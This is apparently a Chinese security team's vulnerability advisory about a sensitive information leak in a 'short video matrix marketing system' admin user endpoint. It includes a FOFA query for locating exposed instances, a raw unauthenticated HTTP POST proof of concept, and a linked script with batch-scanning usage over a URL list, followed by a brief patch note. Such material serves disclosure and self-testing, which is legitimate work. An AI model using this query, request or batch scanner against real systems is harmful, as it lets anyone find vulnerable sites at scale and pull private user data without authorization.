#  【Nday】短视频矩阵营销系统 user 敏感信息泄露漏洞【附poc】   
原创 阿诺  苏诺木安全团队   2024-09-02 19:46  
  
**免责声明：本文仅用于技术学习和讨论。请勿使用本文所提供的内容及相关技术从事非法活动，若利用本文提供的内容或工具造成任何直接或间接的后果及损失，均由使用者本人负责，所产生的一切不良后果均与文章作者及本账号无关。**  
  
**fofa**  
```
title="短视频矩阵营销系统"
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5h6SVtXyicgx52vS4C4esuFKIyG5TAPsvUWzgNpeA4HvuHdm9An6YRPibG4Yv2LPibjy7B7Op8QZ428WO1vAJQISQ/640?wx_fmt=png&from=appmsg "")  
  
**一、漏洞简述**  
  
  
短视频矩阵系统是一种整合多平台短视频内容发布和管理的工具，旨在通过统一的后台实现对视频素材的高效管理、编辑和分发。该系统能够支持多个社交媒体平台的账号同步，优化视频营销策略，提高品牌曝光率，并通过数据分析帮助用户深入了解受众偏好，从而提升内容创作的针对性和效果  
。其接口  
user  
存在敏感信息泄露漏洞  
，攻击者可通过该漏洞获取系统敏感信息。  
  
  
  
**二、漏洞检测poc**  
```
POST /index.php/admin/user/index.html?page=1 HTTP/2
Host: x.x.x.x
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36
Accept-Encoding: gzip, deflate
Accept: */*
Content-Length: 0


```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5h6SVtXyicgx52vS4C4esuFKIyG5TAPsvpRvk1YhQcvuibo786WfibItXPkjpYtUj2adBFQIGqzPSJKwtehwNLicZg/640?wx_fmt=png&from=appmsg "")  
  
**三、漏洞检测脚本**  
  
**安全测试人员可通过该脚本进行探测自身服务是否存在此漏洞：**  
  
https://github.com/ATonysan/poc-exp/blob/main/Shortvideomatrixmarketing_user_InfoLeak.py  
  
批量检测:  
  
python   
Shortvideomatrixmarketing_user_InfoLeak.py  
  
  
  
 -f url.txt  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5h6SVtXyicgxvhhXWuALPCmAQvibP3hD29HbhGfQ5qfECU8PzpwB6uPVepEZlJ0iaTEmyicDOBfOxlgAwbeQ8CYEng/640?wx_fmt=png&from=appmsg "")  
  
单个url检测漏洞:  
  
python   
Shortvideomatrixmarketing_user_InfoLeak.py  
  
  
 -u url  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5h6SVtXyicgz8ayEYZAfXcicicckkrTKakvW8mPVZiachJic8M7koEKcibXSOibCGGgPibpIvODgrMvXT1bicibiacsEgLbUw/640?wx_fmt=png&from=appmsg "")  
  
**四、修复**  
  
官方已更新补丁，请升级至最新版本。  
  
  
